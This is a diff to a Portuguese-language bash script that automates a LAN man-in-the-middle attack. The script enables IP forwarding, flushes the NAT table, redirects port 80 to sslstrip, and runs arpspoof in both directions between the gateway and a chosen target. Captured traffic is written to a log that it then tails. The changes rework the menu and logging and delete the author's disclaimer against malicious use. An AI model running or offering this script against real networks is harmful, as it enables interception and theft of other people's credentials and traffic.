@@ -10,13 +10,11 @@
 DATA=$(date +'%d-%m-%Y-%H-%M')
 PREFIX=/home/jsouza/
 ARQ=cap_$DATA.log
-BANNER=$( figlet -f block -c "souz4" )
+BANNER=$(figlet -f block -c "souz4")
 
 menu(){
-	BANNER
-	echo "########################MENU##############################"
+	echo "$BANNER"
 	echo "########salvando em: $ARQ#############"
-	echo "##########################################################"
 	echo "1. Identificar gateway"
 	echo "2. Identificar target"
 	echo "3. Iniciar"
@@ -39,7 +37,6 @@ get_router(){
 	if [ $? -eq 0 ]
 	then
 		echo "> GATEWAY: $ip_router"
-		sleep 3
 		menu
 	else
 		echo "[ FALHA ] Ocorreram erros!"
@@ -54,7 +51,7 @@ scan_target(){
 	if [ $? -eq 0 ]	
 	then
 		echo "[ OK ] Esses foram os hosts encontrados!"
-		egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' scan_hosts.txt | awk '{print $5}' | less	
+		egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' scan_hosts.txt | awk '{print $5}' | grep [1-9]
 		echo "> Escolha o alvo."
 		menu
 	else
@@ -65,11 +62,11 @@ scan_target(){
 }
 
 iniciar_ataque(){ 
-	echo -e "\n ~ Ativando o ip forward"
+	# Ativando o ip forward, para permitir o roteamento de pacotes entre as interfaces de rede"
 	echo 1 > /proc/sys/net/ipv4/ip_forward
-	echo -e "\n ~ Limpando regras da tabela NAT do iptables"
+	# Limpando regras da tabela NAT do iptables"
 	iptables -t nat -F
-	echo -e "\n ~ Redirecionando o trafego da porta 80 para 10000"
+	# Redirecionando o trafego da porta 80 para 10000"
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 	if [ $? -eq 0 ]
 	then
@@ -79,15 +76,16 @@ iniciar_ataque(){
 		nohup xterm -e 2> /dev/null "arpspoof -i eth0 $ip_router -t $ip_target" &
 		nohup xterm -e 2> /dev/null "arpspoof -i eth0 -t $ip_target $ip_router" &
 		echo -e "\n ~ Iniciando o sslstrip..."
-		echo -e "\n ~ Salvando em: $ARQ"
-		echo -e "\n CAPTURA: $DATA" > $ARQ 2> /dev/null	
-		nohup xterm -e 2> /dev/null "sslstrip -l 10000  >> $ARQ" &	
+		touch $ARQ
+		nohup xterm -e 2> /dev/null "sslstrip -l 10000 -w $ARQ" &		
+		#echo "Data: $DATA" > $ARQ
+		echo "~ Vizualizando captura..."
+		tail -f $ARQ
 	else
 		echo -e "\n [ FALHA ] Ocorreram erros em criar regras."
 		sleep 2
 		exit 0
 	fi
-	tail -f $ARQ
 }
 
 install_req(){
@@ -106,8 +104,6 @@ while true
 do
 	if [ $UID -eq 0 ]
 	then
-		echo "O autor não se responsabiliza por qualquer ato feito com má fé utilizando esse script" 
-		sleep 2
 		clear
 		menu
 	else
